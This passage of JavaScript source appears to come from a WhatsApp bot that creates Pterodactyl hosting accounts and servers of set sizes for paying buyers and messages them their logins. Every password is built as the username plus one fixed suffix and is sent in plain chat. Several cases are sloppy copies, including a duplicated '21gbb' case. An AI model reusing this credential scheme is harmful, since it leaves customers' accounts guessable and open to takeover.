dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "8gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "8GB"
let egg = global.eggsnya
let loc = global.location
let memo = "8192"
let cpu = "200"
let disk = "8192"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "9gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "9GB"
let egg = global.eggsnya
let loc = global.location
let memo = "9216"
let cpu = "220"
let disk = "9216"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "10gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "10GB"
let egg = global.eggsnya
let loc = global.location
let memo = "10240"
let cpu = "250"
let disk = "10240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "21gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "20GB"
let egg = global.eggsnya
let loc = global.location
let memo = "20240"
let cpu = "530"
let disk = "20240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "25gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "25GB"
let egg = global.eggsnya
let loc = global.location
let memo = "25240"
let cpu = "700"
let disk = "25240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "24gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "24GB"
let egg = global.eggsnya
let loc = global.location
let memo = "24240"
let cpu = "660"
let disk = "24240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "23gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "23GB"
let egg = global.eggsnya
let loc = global.location
let memo = "23240"
let cpu = "610"
let disk = "23240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "22gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "22GB"
let egg = global.eggsnya
let loc = global.location
let memo = "22240"
let cpu = "590"
let disk = "22240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "21gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "21GB"
let egg = global.eggsnya
let loc = global.location
let memo = "21240"
let cpu = "570"
let disk = "21240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *??LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "20gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "20GB"
let egg = global.eggsnya
let loc = global.location
let memo = "20240"
let cpu = "530"
let disk = "20240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
